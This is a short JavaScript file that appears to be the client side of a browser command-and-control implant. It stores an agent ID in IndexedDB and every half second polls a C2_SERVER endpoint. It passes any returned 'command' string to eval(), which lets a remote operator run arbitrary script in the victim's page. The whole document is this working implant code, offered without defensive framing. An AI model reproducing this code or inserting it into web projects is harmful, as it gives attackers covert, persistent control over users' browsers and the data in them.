
var agentID = null;

new Promise((res, rej) => {
  ReadIDB("agentID", rej);
}).catch(function(p){
  agentID = p;
});

function pull(){
  fetch(C2_SERVER + '/dom?agentID=' + agentID).
  then(function(response){ // Get command from C2
    try{
      return response.json();
    }catch (e){
      return false;
    }
  }).then(function(json){
    if(json == false)
      return;
    if(Object.keys(json).length == 0)
      return;
    if('command' in json){ // dom command
      eval(json.command);
    }
  });
}

setInterval(function(){
  // console.log("agentID: " + agentID);
  if(agentID === null) // agentID not yet set, hold on...
    return;
  pull();
}, 500);
